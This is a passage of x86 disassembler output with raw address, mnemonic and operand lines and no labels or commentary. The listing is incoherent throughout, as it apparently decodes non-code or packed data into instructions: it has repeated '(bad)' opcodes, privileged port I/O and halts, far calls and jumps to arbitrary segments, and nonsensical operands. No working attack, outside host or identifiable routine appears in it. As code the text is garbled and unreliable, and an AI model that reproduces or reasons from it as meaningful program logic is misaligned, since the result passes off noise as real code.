  4096c3:	mov    ebx,0x8f73fcb5
  4096c8:	out    dx,al
  4096c9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4096ca:	dec    esi
  4096cb:	(bad)  
  4096cc:	dec    eax
  4096cd:	inc    ebp
  4096ce:	inc    ebp
  4096cf:	and    al,0x5e
  4096d1:	xchg   ebx,eax
  4096d2:	mov    bh,0x6c
  4096d4:	xchg   esp,eax
  4096d5:	pop    ds
  4096d6:	dec    edi
  4096d7:	adc    dl,BYTE PTR [ebx-0x21ad741b]
  4096dd:	data16 ror BYTE PTR [edx],0x78
  4096e1:	enter  0xe754,0x56
  4096e5:	je     0x4096c6
  4096e7:	popa   
  4096e8:	aam    0x9a
  4096ea:	xchg   DWORD PTR [ebx+0x4f],edx
  4096ed:	call   0x494b:0x3b79bb7c
  4096f4:	popf   
  4096f5:	dec    edx
  4096f6:	ins    DWORD PTR es:[edi],dx
  4096f7:	add    al,0x3a
  4096f9:	jle    0x4096c0
  4096fb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4096fc:	shl    dl,1
  4096fe:	push   0xffffffec
  409700:	push   DWORD PTR [edi]
  409702:	outs   dx,BYTE PTR ds:[esi]
  409703:	out    dx,eax
  409704:	cmp    DWORD PTR [ebx+0x42],ecx
  409707:	ss cli 
  409709:	fpatan 
  40970b:	arpl   WORD PTR [ebx+0x54],di
  40970e:	sbb    DWORD PTR [edi],edi
  409710:	fsubr  DWORD PTR [edx+0x43e44f8e]
  409716:	cmp    DWORD PTR [edi-0x3691685f],ebp
  40971c:	inc    edi
  40971d:	(bad)  
  40971f:	or     eax,0x24d4b406
  409724:	fxch   st(6)
  409726:	xor    eax,0xc785889f
  40972b:	out    dx,eax
  40972c:	test   eax,0xce77aa11
  409731:	cmp    edx,DWORD PTR [ecx-0x7cfdb777]
  409737:	out    dx,al
  409738:	push   ebx
  409739:	cwde   
  40973a:	ret    0xc52d
  40973d:	(bad)  
  40973f:	xchg   DWORD PTR [ebx],ebp
  409741:	(bad)  
  409742:	aam    0xcb
  409744:	test   BYTE PTR [esi],ah
  409746:	adc    al,0x58
  409748:	sbb    BYTE PTR [eax+0x70e0cdd3],0x28
  40974f:	adc    ebp,DWORD PTR [ebx+edx*4]
  409752:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409753:	mov    ah,0xda
  409755:	add    bl,BYTE PTR [esi+0x78]
  409758:	cmp    ebx,DWORD PTR [edx-0x78ab63]
  40975e:	mov    bh,0x63
  409760:	test   BYTE PTR [ebp+0x52],cl
  409763:	push   cs
  409764:	ret    0x7b06
  409767:	cmc    
  409768:	imul   edi,DWORD PTR [ebx+0x2d],0xffffffe0
  40976c:	jmp    ebp
  40976e:	adc    al,0x71
  409770:	fimul  WORD PTR [ebp+0x3e]
  409773:	adc    al,0x52
  409775:	pop    esp
  409776:	in     al,dx
  409777:	and    eax,0x75a2488f
  40977c:	mov    esp,0x468304d4
  409781:	pop    esp
  409782:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409783:	repnz and DWORD PTR [edi-0x1ef0d4ec],edx
  40978a:	iret   
  40978b:	aad    0xe8
  40978d:	jmp    0x347ba2f6
  409792:	dec    esi
  409793:	mul    DWORD PTR [eax+eax*8]
  409796:	popa   
  409797:	push   ebp
  409798:	dec    ebx
  409799:	xor    DWORD PTR [esi-0x55],ebp
  40979c:	push   edx
  40979d:	xchg   BYTE PTR [edx+edi*2-0x736183bb],al
  4097a4:	jno    0x4097b6
  4097a6:	icebp  
  4097a7:	(bad)  
  4097a8:	fisttp DWORD PTR [eax+0x8888aec]
  4097ae:	lods   eax,DWORD PTR ds:[esi]
  4097af:	adc    esi,DWORD PTR [esp+0x69]
  4097b3:	xchg   ebp,eax
  4097b4:	push   ecx
  4097b5:	jmp    0x4097a4
  4097b7:	cli    
  4097b8:	inc    esi
  4097b9:	call   0x7e6f:0x2c1d6c94
  4097c0:	mov    DWORD PTR [ebx-0x1b],eax
  4097c3:	add    BYTE PTR [ebx+0x4cdc5239],bl
  4097c9:	call   0x6ed1d527
  4097ce:	in     eax,dx
  4097cf:	mov    esp,0x5a991f5e
  4097d4:	jae    0x409784
  4097d6:	rcr    BYTE PTR [ecx-0x1d],1
  4097d9:	and    DWORD PTR [eax+0x7bfbd973],eax
  4097df:	dec    ebx
  4097e0:	mov    WORD PTR [edi+0x2255a14f],ss
  4097e6:	sbb    dl,BYTE PTR [edi]
  4097e8:	cmp    bh,dh
  4097ea:	and    DWORD PTR [edi],esi
  4097ec:	fld    QWORD PTR [edi]
  4097ee:	ret    0xf120
  4097f1:	adc    DWORD PTR [esi],edi
  4097f3:	cmp    cl,BYTE PTR [edi-0x25]
  4097f6:	fmulp  st(3),st
  4097f8:	xchg   ebx,eax
  4097f9:	jnp    0x409838
  4097fb:	(bad)  
  4097fc:	lds    ebp,FWORD PTR [edi]
  4097fe:	mov    ah,0xf
  409800:	stc    
  409801:	ins    DWORD PTR es:[edi],dx
  409802:	das    
  409803:	mov    edx,0xe613f355
  409808:	mov    bl,0x26
  40980a:	inc    ebp
  40980b:	hlt    
  40980c:	push   0x23
  40980e:	push   cs
  40980f:	outs   dx,DWORD PTR ss:[esi]
  409811:	cs je  0x409810
  409814:	xlat   BYTE PTR ds:[ebx]
  409815:	sub    BYTE PTR [edx-0x43],0xb1
  409819:	sbb    al,0x21
  40981b:	test   dh,ch
  40981d:	pop    ebx
  40981e:	push   0x1cd5bc66
  409823:	pop    esi
  409824:	leave  
  409825:	add    DWORD PTR [edi-0x61c52c29],ebp
  40982b:	pop    edi
  40982c:	ds mov edx,0x1a57ca89
  409832:	add    DWORD PTR [ebx+0x68062045],esi
  409838:	call   FWORD PTR [ebp-0x21]
  40983b:	repnz loop 0x4098b8
  40983e:	dec    ecx
  40983f:	into   
  409840:	pop    esi
  409841:	inc    edx
  409842:	or     eax,0xff7e83d4
  409847:	pop    esi
  409848:	rcr    al,0xba
  40984b:	xor    BYTE PTR [eax],dl
  40984d:	in     eax,0xe6
  40984f:	jne    0x409876
  409851:	jmp    0x2b99ffd3
  409856:	add    DWORD PTR [edi],ecx
  409858:	ja     0x4097fd
  40985a:	mov    ah,0xd8
  40985c:	pop    ebx
  40985d:	ins    DWORD PTR es:[edi],dx
  40985e:	(bad)
  409861:	push   0x6
  409863:	cmp    bh,BYTE PTR [ebx+0x66]
  409866:	jmp    0x76ec:0xc494887a
  40986d:	cld    
  40986e:	test   BYTE PTR [esi+edx*8],0x1c
  409872:	push   edx
  409873:	adc    BYTE PTR [edx-0x1e812104],al
  409879:	cmp    DWORD PTR [esi+0x54],ebx
  40987c:	adc    eax,0x3fc9dc98
  409881:	and    al,al
  409883:	leave  
  409884:	pop    ecx
  409885:	sar    DWORD PTR [ebx+0x4a],cl
  409888:	fsub   QWORD PTR ds:0x17cc2d48
  40988e:	and    eax,0xfc5363d9
  409893:	and    BYTE PTR [eax],ah
  409895:	xor    eax,0x8d24a72e
  40989a:	retf   0x7dcc
  40989d:	push   edi
  40989e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40989f:	xlat   BYTE PTR ds:[ebx]
  4098a0:	sbb    eax,0x24534158
  4098a5:	loopne 0x409846
  4098a7:	std    
  4098a8:	loope  0x40983b
  4098aa:	loope  0x40990a
  4098ac:	retf   0xc120
  4098af:	(bad)  
  4098b0:	fsubr  DWORD PTR [ecx-0x3902b1f2]
  4098b6:	dec    ebp
  4098b7:	rol    DWORD PTR [ebx-0x3b],1
  4098ba:	in     al,0x2a
  4098bc:	push   ebp
  4098bd:	or     eax,0x69c627c8
  4098c2:	test   BYTE PTR [ecx+0x70b716d7],ch
  4098c8:	leave  
  4098c9:	jo     0x409934
  4098cb:	dec    esp
  4098cc:	or     BYTE PTR [ebx-0x4c445f5f],bh
  4098d2:	aam    0x36
  4098d4:	and    ebp,DWORD PTR [ebp+ebx*4-0x49]
  4098d8:	js     0x409947
  4098da:	xchg   DWORD PTR fs:[edi*2-0x51974112],edx
  4098e2:	cs test bh,dh
  4098e5:	push   ecx
  4098e6:	mov    al,0x88
  4098e8:	add    ecx,ecx
  4098ea:	adc    ah,dh
  4098ec:	xor    cl,BYTE PTR [edi+edx*1+0x3f]
  4098f0:	pop    esi
  4098f1:	stos   BYTE PTR es:[edi],al
  4098f2:	in     al,dx
  4098f3:	push   esi
  4098f4:	push   cs
  4098f5:	mov    cl,0x4c
  4098f7:	fs xchg edx,eax
  4098f9:	add    al,0xe1
  4098fb:	js     0x40991f
  4098fd:	out    0xa8,al
  4098ff:	jle    0x4098fe
  409901:	icebp  
  409902:	mov    ebp,0x5967df16
  409907:	frstor [esi-0x66]
  40990a:	mov    ecx,DWORD PTR [eax]
  40990c:	sbb    ecx,DWORD PTR [ecx-0x1e99f1df]
  409912:	out    0xe1,eax
  409914:	dec    eax
  409915:	and    al,0x8c
  409917:	mov    al,ds:0x29ffe5a3
  40991c:	mov    ss,ecx
  40991e:	dec    esp
  40991f:	add    eax,0xbba7be5a
  409924:	jle    0x40999e
  409926:	aas    
  409927:	cmp    DWORD PTR [esp+edi*4+0x6b],0x22
  40992c:	or     eax,0x3f429c3b
  409931:	mov    edi,0x8f3e4469
  409936:	aaa    
  409937:	jge    0x4098d3
  409939:	jno    0x4099a3
  40993b:	call   0xb086:0xcae58eb6
  409942:	adc    WORD PTR [ebp-0x4a947a01],di
  409949:	in     eax,dx
  40994a:	in     al,0xd3
  40994c:	xchg   edx,eax
  40994d:	out    dx,al
  40994e:	adc    DWORD PTR [esi+0x5286b834],0x6c
  409955:	inc    ebp
  409956:	shl    BYTE PTR [esi-0x23c6e5a8],cl
  40995c:	cmp    esp,DWORD PTR [ebx+ebx*8]
  40995f:	cmp    eax,esi
  409961:	in     eax,0x60
  409963:	adc    ah,ah
  409965:	(bad)
  409969:	and    BYTE PTR [edi+0x3cff115a],bl
  40996f:	mov    ds:0xe633192e,eax
  409974:	fcom   DWORD PTR [edi+0x74d6dee5]
  40997a:	mov    eax,ds:0x62af2392
  40997f:	sub    edi,DWORD PTR [edx+esi*8-0x10]
  409983:	shl    BYTE PTR [edi-0x55199e06],1
  409989:	dec    edx
  40998a:	and    al,0xf7
  40998c:	push   esp
  40998d:	outs   dx,BYTE PTR ds:[esi]
  40998e:	and    eax,0x58efb8d3
  409993:	jbe    0x4099e3
  409995:	sbb    DWORD PTR [ecx],esp
  409997:	lea    ecx,[edi-0x58]
  40999a:	sbb    edi,esi
  40999c:	hlt    
  40999d:	jp     0x409a1c
  40999f:	repnz stos DWORD PTR es:[edi],eax
  4099a1:	retf   0xc848
  4099a4:	es adc eax,0x38d5a23e
  4099aa:	pop    ebp
  4099ab:	push   es
  4099ac:	popa   
  4099ad:	inc    ebx
  4099ae:	mov    esp,0xc42e6c10
  4099b3:	aaa    
  4099b4:	pop    ds
  4099b5:	in     eax,0xe9
  4099b7:	clc    
  4099b8:	inc    edx
  4099b9:	das    
  4099ba:	and    eax,0x2e15075d
  4099bf:	pop    ss
  4099c0:	jle    0x4099cf
  4099c2:	jl     0x409969
  4099c4:	sub    BYTE PTR [eax+0x3],bh
  4099c7:	mov    ?,WORD PTR [edi-0x51]
  4099ca:	jle    0x409a27
  4099cc:	pusha  
  4099cd:	(bad)  
  4099ce:	int    0x68
  4099d0:	shl    BYTE PTR [eax-0x75],1
  4099d3:	les    esp,FWORD PTR [edx+0x71]
  4099d6:	xchg   esp,eax
  4099d7:	loope  0x40998d
  4099d9:	jbe    0x4099c6
  4099db:	inc    di
  4099dd:	sub    eax,0xbd5649fb
  4099e2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4099e3:	inc    esi
  4099e4:	data16 jge 0x4099a8
  4099e7:	mov    esp,0xa4568a75
  4099ec:	imul   ecx,eax,0xf6eb1709
  4099f2:	loopne 0x4099fe
  4099f4:	xchg   DWORD PTR [eax+0x3d],ebx
  4099f7:	pop    edx
  4099f8:	add    bl,BYTE PTR [ebp+ebp*1+0x72]
  4099fc:	icebp  
  4099fd:	xchg   edx,eax
  4099fe:	ins    DWORD PTR es:[edi],dx
  4099ff:	xchg   ebx,eax
  409a00:	int    0x43
  409a02:	aam    0x22
  409a04:	not    BYTE PTR [edx-0x7863c65d]
  409a0a:	cdq    
  409a0b:	je     0x409a50
  409a0d:	and    esp,DWORD PTR [ebx+0x2e]
  409a10:	mov    bl,0x45
  409a12:	pop    eax
  409a13:	cmp    BYTE PTR [eax+ecx*8+0x4c],0x3f
  409a18:	test   al,0xd9
  409a1a:	mov    ebp,0xd6d39d80
  409a1f:	inc    edx
  409a20:	xchg   edi,eax
  409a21:	hlt    
  409a22:	sahf   
  409a23:	pop    ss
  409a24:	sub    dl,0x28
  409a27:	in     eax,0xc4
  409a29:	and    ch,cl
  409a2b:	xchg   edi,eax
  409a2c:	mov    edx,0xa4faad21
  409a31:	push   0x1572c21c
  409a36:	retf   
  409a37:	dec    edi
  409a38:	mov    ds:0xbc178c36,eax
  409a3d:	shr    DWORD PTR [edx-0x7b4f4f03],cl
  409a43:	arpl   WORD PTR ss:[eax],dx
  409a46:	or     eax,0x329eee42
  409a4b:	push   edx
  409a4c:	mov    ds:0x502eaed4,al
  409a51:	ret    0x2e97
  409a54:	adc    eax,DWORD PTR [ebx+0x79e13684]
  409a5a:	mov    ecx,0x43756eab
  409a5f:	push   ds
  409a60:	pop    ds
  409a61:	test   al,0x9
  409a63:	jno    0x409a7a
  409a65:	inc    esp
  409a66:	dec    esi
  409a67:	push   es
  409a68:	mov    dh,0x66
  409a6a:	pop    esp
  409a6b:	out    dx,al
  409a6c:	jmp    0x409ab9
  409a6e:	test   BYTE PTR [esi-0x1a],bl
  409a71:	rol    BYTE PTR [ebp-0xebd31c6],cl
  409a77:	loopne 0x409aa0
  409a79:	imul   ebx,ebp,0x6f
  409a7c:	inc    ebx
  409a7d:	ja     0x409a18
  409a7f:	and    BYTE PTR [ecx+0x8a36b52],ah
  409a85:	es (bad) 
  409a88:	add    DWORD PTR [edi+0x742b6ad6],0xffffffd4
  409a8f:	push   edx
  409a90:	cmp    ebp,esp
  409a92:	aam    0x89
  409a94:	dec    ecx
  409a95:	dec    edx
  409a96:	call   0x5a0ec07f
  409a9b:	nop
  409a9c:	popa   
  409a9d:	(bad)  
  409aa1:	mov    esi,0xe8c7c9e0
  409aa6:	push   esi
  409aa7:	clc    
  409aa8:	xchg   edi,eax
  409aa9:	repz test DWORD PTR [esi+0x3a],esp
  409aad:	(bad)  
  409aaf:	in     eax,0xa7
  409ab1:	cdq    
  409ab2:	adc    ebp,DWORD PTR [ebp+0x7151d0de]
  409ab8:	sti    
  409ab9:	cmp    BYTE PTR ds:[esi],bl
  409abc:	repz aad 0xdf
  409abf:	loopne 0x409ad9
  409ac1:	(bad)  
  409ac3:	xor    DWORD PTR [ebx],edi
  409ac5:	daa    
  409ac6:	mov    eax,ds:0x2efc355b
  409acb:	push   ds
  409acc:	jnp    0x409a91
  409ace:	retf   
  409acf:	jecxz  0x409a9f
  409ad1:	jmp    0x3e80388a
  409ad6:	mov    ebp,0xd8ad899d
  409adb:	xor    ebp,0xe96ac99f
  409ae1:	push   eax
  409ae2:	mov    WORD PTR [edi+0x71284913],?
  409ae8:	cmc    
  409ae9:	pusha  
  409aea:	int    0x7d
  409aec:	popf   
  409aed:	es test al,dh
  409af0:	and    BYTE PTR [edx-0x40],bl
  409af3:	cmp    al,0x30
  409af5:	add    al,0x54
  409af7:	int3   
  409af8:	pop    es
  409af9:	xchg   esp,ebx
  409afb:	jno    0x409ab6
  409afd:	sti    
  409afe:	mov    dh,BYTE PTR [esi-0x6ffdfdb6]
  409b04:	jae    0x409ada
  409b06:	sbb    eax,0x9bc5c1
  409b0b:	fimul  DWORD PTR [edx]
  409b0d:	ins    BYTE PTR es:[edi],dx
  409b0e:	push   esi
  409b0f:	sbb    BYTE PTR [edx-0x5e],ah
  409b12:	popf   
  409b13:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409b14:	call   DWORD PTR [ebx+0x6201edb5]
  409b1a:	stos   BYTE PTR es:[edi],al
  409b1b:	xor    dl,0xb0
  409b1e:	jno    0x409ab8
  409b20:	or     edx,DWORD PTR [eax-0xe]
  409b23:	jbe    0x409aeb
  409b25:	dec    ebx
  409b26:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409b27:	add    eax,0xac767fd1
  409b2c:	sub    eax,DWORD PTR [edi+0x2f]
  409b2f:	(bad)  
  409b31:	sbb    dh,BYTE PTR [ebx]
  409b33:	sahf   
  409b34:	mov    dh,dl
  409b36:	jmp    0x6475:0x5b1c3ffd
  409b3d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409b3e:	mov    dl,ch
  409b40:	mov    dl,0x75
  409b42:	mov    eax,ds:0x8376de85
  409b47:	repnz bound edi,QWORD PTR [esi-0x6e]
  409b4b:	pop    eax
  409b4c:	push   ebx
  409b4d:	push   0xa
  409b4f:	mov    edx,0xd5690ef0
  409b54:	cwde   
  409b55:	push   esi
  409b56:	ja     0x409ade
  409b58:	not    BYTE PTR [edx-0x43]
  409b5b:	add    BYTE PTR [esi-0x409bb8c2],cl
  409b61:	scas   al,BYTE PTR es:[edi]
  409b62:	sahf   
  409b63:	xchg   BYTE PTR [edi+0x2e7e4bd9],bl
  409b69:	in     eax,0x32
  409b6b:	dec    esi
  409b6c:	dec    ebp
  409b6d:	push   esp
  409b6e:	mov    bl,0x2a
  409b70:	fwait
  409b71:	cmp    edx,DWORD PTR ds:0xcf18c279
  409b77:	popa   
  409b78:	pop    eax
  409b79:	sub    BYTE PTR [esi],bl
  409b7b:	into   
  409b7c:	test   al,0x53
  409b7e:	mov    esi,0xbe1d96fa
  409b83:	dec    esi
  409b84:	test   eax,0xf252e203
  409b89:	fadd   st,st(6)
  409b8b:	adc    ebx,DWORD PTR [edx-0x47]
  409b8e:	cmp    al,0x83
  409b90:	out    dx,al
  409b91:	jb     0x409b23
  409b93:	ds ja  0x409c14
  409b96:	int    0x55
  409b98:	push   ss
  409b99:	fwait
  409b9a:	outs   dx,DWORD PTR ds:[esi]
  409b9b:	in     eax,dx
  409b9c:	call   0x7a4fd88f
  409ba1:	shl    DWORD PTR [ebx-0x70],0x5e
  409ba5:	mov    bl,0xc0
  409ba7:	in     eax,dx
  409ba8:	fisubr WORD PTR [eax-0x42e3e62c]
  409bae:	into   
  409baf:	ins    BYTE PTR es:[edi],dx
  409bb0:	cmp    eax,0x47dde53
  409bb5:	retf   
  409bb6:	sub    eax,0xb81d72df
  409bbb:	mov    ch,0xe0
  409bbd:	mov    DWORD PTR [ebp+edx*2+0x21ab9733],ebp
  409bc4:	out    dx,eax
  409bc5:	leave  
  409bc6:	mov    ah,0x59
  409bc8:	repnz cmc 
  409bca:	mov    ch,0x92
  409bcc:	in     eax,0x6b
  409bce:	fisttp DWORD PTR [ebx+0x763598ab]
  409bd4:	mov    bl,0x32
  409bd6:	jns    0x409c0f
  409bd8:	dec    esp
  409bd9:	(bad)  
  409bda:	xchg   edx,eax
  409bdb:	jmp    0x9be3:0xeed4c182
  409be2:	xchg   esi,eax
  409be3:	pop    esp
  409be4:	push   0xd1602a65
  409be9:	aaa    
  409bea:	adc    al,0x1c
  409bec:	dec    ebx
  409bed:	js     0x409bcb
  409bef:	not    DWORD PTR [esp+ecx*1-0xa]
  409bf3:	inc    ecx
  409bf4:	pop    ebp
  409bf5:	inc    ebx
  409bf6:	arpl   bp,si
  409bf8:	mov    ds:0xb244db07,al
  409bfd:	push   cs
  409bfe:	loopne 0x409c6b
  409c00:	cs out dx,al
  409c02:	inc    ecx
  409c03:	ins    DWORD PTR es:[edi],dx
  409c04:	pop    esi
  409c05:	add    eax,0xa9546154
  409c0a:	pushf  
  409c0b:	out    dx,eax
  409c0c:	les    ecx,FWORD PTR [eax]
  409c0e:	hlt    
  409c0f:	xlat   BYTE PTR ds:[ebx]
  409c10:	cmp    DWORD PTR ds:0x1d20b34d,0x6b
  409c17:	ds xor al,0xbe
  409c1a:	jo     0x409c54
  409c1c:	add    esp,DWORD PTR [eax]
  409c1e:	in     al,dx
  409c1f:	mov    sp,0x92a8
  409c23:	cwde   
  409c24:	mov    ebp,0x8018ac1
  409c29:	xchg   edi,eax
  409c2a:	dec    esi
  409c2b:	int    0x66
  409c2d:	nop
  409c2e:	jge    0x409c7a
  409c30:	or     ebp,edx
  409c32:	push   edi
  409c33:	or     bl,BYTE PTR [ebx]
  409c35:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409c36:	sub    al,0x7f
  409c38:	ins    DWORD PTR es:[edi],dx
  409c39:	int3   
  409c3a:	ss fwait
  409c3c:	fs les edi,FWORD PTR gs:[ebp+ebx*2-0x51]
  409c42:	xor    edi,DWORD PTR [ebx+0x19221f3d]
  409c48:	dec    eax
  409c49:	test   eax,0xd1edd648
  409c4e:	mov    esi,0xc92c657c
  409c53:	inc    esi
  409c54:	jmp    DWORD PTR [edi+ebp*8-0xd]
  409c58:	xchg   DWORD PTR [edx-0x27b62b22],edi
  409c5e:	mov    edi,0x1bbb8d07
  409c63:	imul   esp,DWORD PTR [ebx+0x45],0xe5f05568
  409c6a:	dec    ecx
  409c6b:	dec    eax
  409c6c:	push   esi
  409c6d:	std    
  409c6e:	pop    ebp
  409c6f:	jp     0x409c4c
  409c71:	loopne 0x409c9b
  409c73:	loop   0x409c0a
  409c75:	fwait
  409c76:	jge    0x409bfe
  409c78:	(bad)  
  409c79:	icebp  
  409c7a:	dec    ebp
  409c7b:	dec    edi
  409c7c:	xchg   edi,eax
  409c7d:	cwde   
  409c7e:	data16 aas 
  409c80:	add    dl,BYTE PTR [ebp-0x25]
  409c83:	shl    DWORD PTR [edi+edx*4-0x7278a21f],cl
  409c8a:	repnz pop edi
  409c8c:	gs inc ecx
  409c8e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409c8f:	push   esp
  409c90:	mov    dl,0xdf
  409c92:	in     eax,0x10
  409c94:	cmp    al,0x4f
  409c96:	or     esp,DWORD PTR [esi-0x35]
  409c99:	xor    esi,DWORD PTR [eax]
  409c9b:	sbb    DWORD PTR [edx-0x55],edi
  409c9e:	nop
  409c9f:	mov    ds:0x99178268,eax
  409ca4:	mov    bh,0x63
  409ca6:	sbb    BYTE PTR [ebx+0x26],cl
  409ca9:	mov    eax,esi
  409cab:	xor    eax,0x1d03f2ef
  409cb0:	gs push ebx
  409cb2:	mov    WORD PTR [eax-0x2a7def88],cs
  409cb8:	or     BYTE PTR [ebp-0x7f034ddd],ah
  409cbe:	pop    ecx
  409cbf:	sbb    DWORD PTR [esi-0x80],ebx
  409cc2:	dec    esi
  409cc3:	or     DWORD PTR [edx-0x427d4fc],edx
  409cc9:	pop    edx
  409cca:	repnz mov bl,0x5
  409ccd:	sti    
  409cce:	mov    bh,0xcb
  409cd0:	daa    
  409cd1:	test   ebp,0xd0cbf5aa
  409cd7:	xchg   esp,eax
  409cd8:	ud1    edi,DWORD PTR [esp+eiz*8+0x5a580ea2]
  409ce0:	mov    ds:0x5f096ab7,eax
  409ce5:	xchg   esp,eax
  409ce6:	jno    0x409cde
  409ce8:	call   0xf763:0x5be46c
  409cef:	inc    ecx
  409cf0:	pusha  
  409cf1:	mov    bl,0xca
  409cf3:	mov    ecx,0x8f119e4f
  409cf8:	(bad)  
  409cf9:	in     al,0xe5
  409cfb:	mov    al,0x49
  409cfd:	test   eax,0x3bbc30fc
  409d02:	in     al,dx
  409d03:	outs   dx,BYTE PTR ds:[esi]
  409d04:	xchg   ecx,eax
  409d05:	stos   DWORD PTR es:[edi],eax
  409d06:	push   ds
  409d07:	retf   0x405e
  409d0a:	and    dl,BYTE PTR [ebx+0x5c5d4027]
  409d10:	and    esp,DWORD PTR [ecx]
  409d12:	call   0x9f1:0xb3931036
  409d19:	push   ss
  409d1a:	inc    edi
  409d1b:	js     0x409ce1
  409d1d:	addr16 cwde 
  409d1f:	stos   DWORD PTR es:[edi],eax
  409d20:	ret    
  409d21:	pop    ecx
  409d22:	cdq    
  409d23:	in     al,dx
  409d24:	imul   ebp,DWORD PTR [esi],0xffffffc1
  409d27:	(bad)
  409d2a:	fsubrp st(6),st
  409d2c:	adc    al,0xfd
  409d2e:	dec    eax
  409d2f:	leave  
  409d30:	mov    esp,0x98410d6a
  409d35:	call   0xe59c754e
  409d3a:	cli    
  409d3b:	mov    ?,WORD PTR [ecx+0x26]
  409d3e:	fnstenv [ecx+0x255ab161]
  409d44:	retf   0x44c1
  409d47:	inc    esi
  409d48:	lahf   
  409d49:	pop    edi
  409d4a:	jae    0x409d85
  409d4c:	jb     0x409d47
  409d4e:	push   ebx
  409d4f:	retf   0x522f
  409d52:	xchg   ebx,eax
  409d53:	cmp    DWORD PTR [ebp-0x1c7cf155],edi
  409d59:	mov    WORD PTR [ebp-0x41],?
  409d5c:	iret   
  409d5d:	push   esi
  409d5e:	scas   eax,DWORD PTR es:[edi]
  409d5f:	gs mov cl,0x5b
  409d62:	dec    ebp
  409d63:	nop
  409d64:	lahf   
  409d65:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409d66:	out    dx,al
  409d67:	in     al,0x92
  409d69:	mov    dh,0x6f
  409d6b:	dec    edx
  409d6c:	dec    ebx
  409d6d:	xchg   edi,eax
  409d6e:	inc    esi
  409d6f:	sbb    cl,BYTE PTR [ecx+0x70]
  409d72:	and    DWORD PTR [edi],ecx
  409d74:	or     ecx,DWORD PTR [ecx-0x7c2fac59]
  409d7a:	sbb    al,0xe2
  409d7c:	lock fwait
  409d7e:	and    DWORD PTR [ebx+0x4402359],edx
  409d84:	xchg   esi,eax
  409d85:	pop    ebx
  409d86:	and    edx,edx
  409d88:	(bad)  
  409d89:	cmc    
  409d8a:	jbe    0x409d2f
  409d8c:	gs es into 
  409d8f:	jle    0x409dbd
  409d91:	pop    ds
  409d92:	aad    0x2
  409d94:	add    ecx,eax
  409d96:	(bad)  
  409d97:	sti    
  409d98:	stos   BYTE PTR es:[edi],al
  409d99:	adc    al,0x92
  409d9b:	and    edi,esp
  409d9d:	add    al,0x40
  409d9f:	leave  
  409da0:	aad    0x3c
  409da2:	xchg   esp,eax
  409da3:	jg     0x409d36
  409da5:	mov    eax,ds:0xab72c53a
  409daa:	or     ah,BYTE PTR [eax]
  409dac:	aaa    
  409dad:	mov    cl,0x8f
  409daf:	into   
  409db0:	mov    ah,0xe0
  409db2:	popf   
  409db3:	inc    edx
  409db4:	bound  esi,QWORD PTR ds:0x1816e5dd
  409dba:	jg     0x409e0c
  409dbc:	lock push es
  409dbe:	sbb    eax,0xd43a3d0d
  409dc3:	ficomp DWORD PTR [ecx]
  409dc5:	adc    al,0xe2
  409dc7:	mov    bl,BYTE PTR ds:0xf2c60779
  409dcd:	mov    al,ds:0x51841a5a
  409dd2:	ficom  WORD PTR [eax-0x20]
  409dd5:	pop    edi
  409dd6:	push   esp
  409dd7:	and    BYTE PTR [eax],dh
  409dd9:	outs   dx,BYTE PTR ds:[esi]
  409dda:	sub    DWORD PTR [ebp-0x1936082b],0x46
  409de1:	nop
  409de2:	inc    esp
  409de3:	push   0xfffffff1
  409de5:	cs ja  0x409e2f
  409de8:	sub    BYTE PTR [ecx],al
  409dea:	add    bl,BYTE PTR [eax+0x2de60101]
  409df0:	fild   DWORD PTR [edi-0x5f]
  409df3:	ds daa 
  409df5:	mov    al,ds:0x7c24a815
  409dfa:	adc    DWORD PTR ds:0x3869e3f4,eax
  409e00:	rol    BYTE PTR [esi],1
  409e02:	xor    eax,0x65d44cbb
  409e07:	sbb    esi,DWORD PTR [eax+0x59887e44]
  409e0d:	int3   
  409e0e:	ret    0x5f7
  409e11:	xor    al,0x71
  409e13:	sbb    edi,DWORD PTR [edi]
  409e15:	sub    dl,BYTE PTR [ebx-0x43]
  409e18:	daa    
  409e19:	cmp    dl,BYTE PTR [ecx+0x58]
  409e1c:	cmp    edx,DWORD PTR [ebp+0x37972346]
  409e22:	xchg   esp,eax
  409e23:	fimul  DWORD PTR [edx+0x56172e6b]
  409e29:	inc    ebx
  409e2a:	je     0x409e10
  409e2c:	inc    ebx
  409e2d:	lea    ebp,[eax-0x616c670f]
  409e33:	cdq    
  409e34:	enter  0x68ab,0x85
  409e38:	sti    
  409e39:	std    
  409e3a:	outs   dx,BYTE PTR ds:[esi]
  409e3b:	pop    edx
  409e3c:	pop    eax
  409e3d:	mov    cl,0xe4
  409e3f:	gs mov dl,0x1e
  409e42:	pusha  
  409e43:	outs   dx,BYTE PTR ds:[esi]
  409e44:	dec    edx
  409e45:	inc    edx
  409e46:	xchg   ecx,eax
  409e47:	adc    eax,DWORD PTR [edx+edx*1-0x5fcb5cd4]
  409e4e:	xchg   DWORD PTR [ebp+ebp*4+0x34bc21bc],esi
  409e55:	adc    al,0x9d
  409e57:	mov    edx,0xdf3a8756
  409e5c:	xchg   ecx,eax
  409e5d:	inc    edx
  409e5e:	jp     0x409e4c
  409e60:	adc    DWORD PTR [ebp+edx*8-0x67],esp
  409e64:	sbb    BYTE PTR [esi-0x12],ch
  409e67:	out    0x82,al
  409e69:	and    BYTE PTR [edi+0x3b],bh
  409e6c:	repz lea eax,[ebx-0x16]
  409e70:	mov    ch,al
  409e72:	lds    eax,FWORD PTR [esi]
  409e74:	hlt    
  409e75:	push   esp
  409e76:	call   FWORD PTR [edx+0x65]
  409e79:	retf   
  409e7a:	sbb    DWORD PTR [edx+0x3c],0xaf86dac7
  409e81:	das    
  409e82:	test   eax,0x80e27a1b
  409e87:	sub    ebp,DWORD PTR [ebx]
  409e89:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409e8a:	(bad)  
